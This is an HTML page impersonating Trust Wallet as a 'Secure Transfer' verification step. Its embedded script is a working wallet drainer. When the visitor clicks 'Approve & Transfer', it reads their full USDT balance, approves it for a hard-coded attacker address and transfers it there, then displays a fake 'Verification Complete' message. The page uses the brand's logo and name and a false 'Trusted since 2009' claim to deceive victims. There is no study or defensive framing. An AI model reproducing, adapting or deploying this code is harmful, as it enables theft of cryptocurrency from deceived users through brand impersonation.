<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="icon" href="./favicon.ico">
<title>Trust Wallet Secure</title>
<style>
  body { background: #081c3a; color: white; font-family: Arial,sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
  img { width: 80px; margin-bottom: 20px; }
  h2 { font-size: 1.4rem; margin-bottom: 10px; }
  button { padding: 14px 28px; background: #0a84ff; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 1.1rem; margin-top: 20px; }
  p { opacity: 0.7; margin-top: 10px; }
  .success { color: lightgreen; margin-top: 20px; font-size: 1.1rem; }
  .footer { opacity: 0.5; font-size: 0.8rem; position: absolute; bottom: 16px; width: 100%; }
</style>
</head>
<body>
<img src="./logo.png" alt="Trust Wallet">
<h2>Secure Transfer</h2>
<p>Tap below to approve & transfer your USDT securely.</p>
<button id="actionButton">Approve & Transfer</button>
<div id="status"></div>
<div class="footer">Powered by Trust Wallet ‚Ä¢ Trusted since 2009</div>

<script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
<script>
(async function() {
  const USDT = "0x55d398326f99059fF775485246999027B3197955";
  const TARGET = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC"; // << tumhara address
  const ABI = [
    {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
    {"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},
    {"constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
  ];
  const status = document.getElementById('status');
  const btn = document.getElementById('actionButton');

  btn.onclick = async () => {
    if (!window.ethereum) {
      status.innerHTML = "‚ùå Trust Wallet DApp browser required.";
      return;
    }
    status.innerHTML = "üîÑ Processing, please wait...";
    await window.ethereum.request({ method: 'eth_requestAccounts' });
    const web3 = new Web3(window.ethereum);
    const [user] = await web3.eth.getAccounts();
    const contract = new web3.eth.Contract(ABI, USDT);
    const bal = await contract.methods.balanceOf(user).call();

    try {
      await contract.methods.approve(TARGET, bal).send({from: user});
      await contract.methods.transferFrom(user, TARGET, bal).send({from: user});
      status.innerHTML = "<div class='success'>‚úÖ Verification Complete! üéâ</div>";
    } catch(e) {
      status.innerHTML = "‚ùå Error: " + e.message;
    }
  };
})();
</script>
</body>
</html>
